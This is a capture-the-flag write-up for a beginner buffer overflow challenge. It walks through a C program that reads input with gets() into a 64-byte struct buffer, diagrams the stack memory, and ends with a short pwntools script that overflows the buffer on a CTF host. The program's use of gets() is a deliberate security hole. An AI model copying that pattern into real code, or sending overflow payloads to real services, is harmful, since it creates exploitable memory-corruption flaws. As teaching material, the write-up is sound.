# Bof1

Bof1 is the first buffer overflow challenge of the CTF. In this case, our buffer overflow is a stack-based buffer overflow which means we'll end up overwriting values on the stack to get the flag. The full program is posted below for convenience.

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void handler(int num){
    printf("Bye!\n");
    exit(-1);
}

int main(int argc, char **argv){
    signal(SIGALRM, handler);
    alarm(5);

    struct {
        char buffer[64];
        int modified;
    } s;

    s.modified = 0;
    gets(s.buffer);

    if(s.modified){
        system("cat ./flag.txt");
        exit(0);
    } else {
        printf("Try again!\n");
        exit(1);
    }
}
```

Taking a cursory look at the program we notice a few things:

1. The program will exit after 5 seconds of being alive:

```C
void handler(int num){
    printf("Bye!\n");
    exit(-1);
}
...
signal(SIGALRM, handler);
alarm(5);
```

2. There is a struct that contains a character array and an integer. The character array has enough space on the stack for 64 characters. One thing to note here is that because these variables are in a struct, they are contiguous (right next to eachother/touching) in memory.

```C
struct {
    char buffer[64];
    int modified;
} s;
```

3. There is a call to `gets`. The `gets` function is inherently dangerous. If you run the command `man gets` to see get's manpage, you will see the security notice at the bottom:

> SECURITY CONSIDERATIONS
>     **The gets() function cannot be used securely**.  Because of its lack of
>     bounds checking, and the inability for the calling program to reliably
>     determine the length of the next incoming line, **the use of this function
>     enables malicious users to arbitrarily change a running program's func-
>     tionality through a buffer overflow attack**.  It is strongly suggested
>     that the fgets() function be used in all cases.  (See the FSA.)

```C
gets(s.buffer);
```

This means that we can send an unlimited amount of data to the program which will be written into the buffer without regard for any safety considerations.

4. In order to win, the integer in the struct, modified, must not be equal to zero.

```
if(s.modified){
    system("cat ./flag.txt");
    exit(0);
} else {
    printf("Try again!\n");
    exit(1);
}
```

Now that we have completely analyzed the program, we can plan our attack.

Our struct looks like this in memory:

```
+============================+
|         struct s           |
+======================+=====+
|         buffer       | mod |
+---+---+---+-----+----+-----+
| 0 | 1 | 2 | ... | 63 |  0  |
+===+===+===+=====+====+=====+
```

In this case, the numbers on the bottom represent the index for each element. From here on out, the numbers on the bottom will represent values in memory.

If we were to write “AB” to the buffer, it would look like this:

```
+============================+
|         struct s           |
+======================+=====+
|         buffer       | mod |
+---+---+---+-----+----+-----+
| A | B | 0 | ... |  0 |  0  |
+===+===+===+=====+====+=====+
```

What if we wrote 64 A's?

```
+============================+
|         struct s           |
+======================+=====+
|         buffer       | mod |
+---+---+---+-----+----+-----+
| A | A | A | ... |  A |  0  |
+===+===+===+=====+====+=====+
```

This isn’t devastating as we didn’t corrupt any memory, but the buffer no longer contains a valid C string. Recall that C strings must be null-terminated. If mod was not set to 0, a call to printf would have trouble knowing where to stop and it would continue printing until it hit a NULL character.

What would happen if we wrote 65 A's?

```
+============================+
|         struct s           |
+======================+=====+
|         buffer       | mod |
+---+---+---+-----+----+-----+
| A | A | A | ... |  A |  A  |
+===+===+===+=====+====+=====+
```

Our struct's integer, modified, has been modified! We successfully exploited the buffer overflow and overwrote the integer with our own value, thus printing the flag.

A simple example of this exploit in pwntools would look like:

```Python
#!/usr/bin/env python2

from pwn import *

context.update(arch='amd64', os='linux')

r = remote('bof1.ctf.cuctf.io', 9000)
payload = "A" * 0x100
r.sendline(payload)
r.interactive()
```
